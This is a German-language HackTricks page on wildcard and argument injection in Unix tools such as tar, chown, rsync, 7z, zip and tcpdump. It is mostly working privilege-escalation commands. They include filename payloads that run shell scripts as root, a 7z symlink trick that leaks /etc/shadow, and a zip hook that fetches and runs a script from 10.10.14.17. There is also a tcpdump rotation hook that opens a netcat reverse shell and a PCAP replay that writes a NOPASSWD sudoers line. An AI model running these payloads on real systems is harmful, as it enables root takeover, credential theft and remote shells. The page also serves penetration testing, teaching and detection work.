# Zusätzliche Wildcard-Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard- (auch *glob*) **argument injection** tritt auf, wenn ein privilegiertes Script ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einem nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.
> Da die Shell die Wildcard **vor** der Ausführung des Binarys erweitert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen erzeugen, die mit `-` beginnen, sodass sie als **Optionen statt als Daten** interpretiert werden und dadurch beliebige Flags oder sogar Befehle eingeschleust werden können.
> Diese Seite sammelt die nützlichsten Primitives, aktuelle Forschung und moderne Erkennungsmechanismen für 2023-2025.

## chown / chmod

Du kannst **den Besitzer/die Gruppe oder die Berechtigungsbits einer beliebigen Datei kopieren**, indem du das Flag `--reference` missbrauchst:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wenn root später etwas wie Folgendes ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` wird injiziert, wodurch *alle* passenden Dateien die Eigentümerschaft/Berechtigungen von `/root/secret``file` erben.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).  
Siehe auch das klassische DefenseCode-Paper für weitere Details.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Führe beliebige Befehle aus, indem du die **checkpoint**-Funktion missbrauchst:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sobald root beispielsweise `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.

### bsdtar / macOS 14+

Das standardmäßige `tar` in aktuellen macOS-Versionen (basierend auf `libarchive`) implementiert *nicht* `--checkpoint`. Mit dem Flag **--use-compress-program**, über das sich ein externer Compressor angeben lässt, kann jedoch weiterhin eine Code-Ausführung erreicht werden.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wenn ein privilegiertes Script `tar -cf backup.tar *` ausführt, wird `/bin/sh` gestartet.

---

## rsync

Mit `rsync` kannst du die Remote-Shell oder sogar die Remote-Binärdatei über Kommandozeilenoptionen überschreiben, die mit `-e` oder `--rsync-path` beginnen:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, startet das injizierte Flag deine Shell auf der Remote-Seite.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (im `rsync`-Modus).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Script das Wildcard defensiv mit `--` voranstellt (um das Parsen von Optionen zu verhindern), unterstützt das 7-Zip-Format **Dateilisten-Dateien**, indem dem Dateinamen ein `@` vorangestellt wird. In Kombination mit einem Symlink kannst du dadurch *beliebige Dateien exfiltrieren*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip versucht, `root.txt` (→ `/etc/shadow`) als file list zu lesen, und bricht ab, wobei es den **Inhalt nach stderr ausgibt**.

Dies funktioniert auch mit `-- *`, da die 7-Zip-CLI sowohl reguläre Dateinamen als auch `@listfiles` als positionale Eingaben ausdrücklich akzeptiert. Daher wird ein wörtlicher Dateiname wie `@root.txt` weiterhin speziell behandelt.

---

## zip

Es gibt zwei sehr praktische Primitives, wenn eine Anwendung benutzerkontrollierte Dateinamen an `zip` übergibt (entweder über einen Wildcard oder durch das Aufzählen von Namen ohne `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE über test hook: `-T` aktiviert „test archive“, und `-TT <cmd>` ersetzt den tester durch ein beliebiges Programm (long form: `--unzip-command <cmd>`). Wenn du Dateinamen einschleusen kannst, die mit `-` beginnen, teile die Flags auf verschiedene Dateinamen auf, damit das Parsing der short options funktioniert:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Hinweise
- Versuche NICHT, einen einzelnen Dateinamen wie `'-T -TT <cmd>'` zu verwenden — kurze Optionen werden zeichenweise geparst, und dies wird fehlschlagen. Verwende separate Tokens wie gezeigt.
- Wenn Schrägstriche von der App aus Dateinamen entfernt werden, rufe Daten von einem einfachen Host/einer einfachen IP ab (Standardpfad `/index.html`), speichere sie lokal mit `-O` und führe sie anschließend aus.
- Du kannst das Parsing mit `-sc` (verarbeitete argv anzeigen) oder `-h2` (weitere Hilfe) debuggen, um zu verstehen, wie deine Tokens verarbeitet werden.

Beispiel (lokales Verhalten bei zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Wenn die Web-Schicht die `zip`-stdout/stderr-Ausgabe zurückgibt (häufig bei naiven Wrappers), werden injizierte Flags wie `--help` oder durch fehlerhafte Optionen verursachte Fehler in der HTTP-Antwort sichtbar. Dadurch werden Command-line injection bestätigt und das Tuning der Payloads erleichtert.

---

## Zusätzliche Binaries, die für wildcard injection anfällig sind (Kurzliste 2023-2025)

Die folgenden Commands wurden in modernen CTFs und realen Umgebungen missbraucht. Die Payload wird immer als *Dateiname* innerhalb eines beschreibbaren Verzeichnisses erstellt, das später mit einem Wildcard verarbeitet wird:

| Binary | Zu missbrauchendes Flag | Effekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → beliebige `@file` | Dateiinhalte lesen |
| `flock` | `-c <cmd>` | Command ausführen |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution über git via SSH |
| `scp`   | `-S <cmd>` | Beliebiges Programm anstelle von ssh starten |

Diese Primitives sind weniger verbreitet als die Klassiker *tar/rsync/zip*, sollten bei der Suche jedoch überprüft werden.

---

## Suche nach verwundbaren Wrappers und Jobs

Aktuelle Fallstudien haben gezeigt, dass wildcard/argv injection nicht mehr nur ein **cron + tar**-Problem ist.<sup>[[5]](#references)</sup> Dieselbe Bug-Klasse taucht weiterhin auf bei:

- Web-Features, die "alles als zip/tar herunterladen" aus von Angreifern kontrollierten Upload-Verzeichnissen
- Debug-Shells von Vendoren/Appliances, die einen **tcpdump**-Wrapper mit von Angreifern kontrollierten Dateinamen-/Filterfeldern bereitstellen
- Backup- oder Rotation-Jobs, die `tar`, `rsync`, `7z`, `zip`, `chown` oder `chmod` auf beschreibbaren Verzeichnissen ausführen

Nützliche Triage-Commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Schnelle Heuristiken:

- `-- *` ist für viele GNU-Tools eine gute Lösung, aber **nicht** für `7z`/`7za`, da `@listfiles` separat geparst werden.
- Suche bei `zip` nach Wrappers, die vom Benutzer kontrollierte Dateinamen direkt aufzählen; die Aufteilung von Short-Optionen (`-T` + `-TT <cmd>`) funktioniert weiterhin, auch ohne einen Shell-Glob.
- Achte bei `tcpdump` besonders auf Wrappers, bei denen du **Ausgabedateinamen**, **Rotationseinstellungen** oder Argumente für das Replay von Capture-Dateien kontrollieren kannst.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in Wrappers

Wenn eine restricted shell oder ein Vendor-Wrapper eine `tcpdump`-Kommandozeile durch Verkettung von benutzerkontrollierten Feldern (z. B. einem Parameter für den "Dateinamen") ohne strikte Quoting-/Validierungsmaßnahmen erstellt, kannst du zusätzliche `tcpdump`-Flags einschleusen. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Begrenzung der Dateianzahl) und `-z <cmd>` (post-rotate command) ermöglicht die Ausführung beliebiger Befehle als der Benutzer, unter dem tcpdump läuft (auf Appliances häufig root).<sup>[[1]](#references)[[4]](#references)</sup>

Voraussetzungen:

- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Der Wrapper bereinigt weder Leerzeichen noch Tokens, die im Dateinamenfeld mit `-` beginnen.

Klassischer PoC (führt ein reverse shell script aus einem beschreibbaren Pfad aus):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` erzwingt eine sofortige Rotation nach dem ersten passenden Paket.
- `-z <cmd>` führt den post-rotate-Befehl einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein Script/Interpreter ist, stelle sicher, dass die Argumentverarbeitung zu deinem Payload passt.

Varianten ohne Wechselmedien:

- Wenn du über ein anderes Primitive zum Schreiben von Dateien verfügst (z. B. einen separaten command wrapper, der output redirection erlaubt), lege dein Script in einem bekannten Pfad ab und triggere `-z /bin/sh /path/script.sh` oder `-z /path/script.sh`, abhängig von der Semantik der jeweiligen Plattform.
- Einige Vendor-Wrapper rotieren in vom Angreifer kontrollierbare Speicherorte. Wenn du den Pfad der rotierten Datei beeinflussen kannst (Symlink/Directory Traversal), kannst du `-z` so steuern, dass Inhalte ausgeführt werden, die du vollständig kontrollierst, ohne externe Medien zu benötigen.

---

## sudoers: tcpdump mit Wildcards/zusätzlichen Argumenten → beliebiges Schreiben/Lesen und root

Sehr häufiges sudoers-Anti-Pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Der `*`-Glob und freizügige Patterns beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.
- Die Regel legt keine anderen Optionen fest, daher sind `-Z`, `-r`, `-V` usw. erlaubt.

Primitives
- Zielpfad mit einem zweiten `-w` überschreiben (das erste erfüllt nur die sudoers-Anforderung):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um den eingeschränkten Verzeichnisbaum zu verlassen:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge den Besitz der Ausgabe mit `-Z root` (erstellt überall Dateien im Besitz von root):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Schreiben beliebiger Inhalte durch das Wiedergeben eines präparierten PCAP über `-r` (z. B. zum Ablegen einer sudoers-Zeile):

<details>
<summary>Erstelle ein PCAP, das den exakten ASCII-Payload enthält, und schreibe ihn als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Beliebiges Lesen von Dateien/secret leak mit `-V <file>` (interpretiert eine Liste von savefiles). Fehlerdiagnosen geben häufig Zeilen wieder und leaken dadurch Inhalte:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referenzen

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-Argument-Injection zu RCE + tcpdump-Sudo-Fehlkonfiguration für Privilege Escalation](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Vollständige Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potenzielle Shell über Wildcard-Injection erkannt](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Zurück in die Zukunft: Unix-Wildcards außer Kontrolle (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
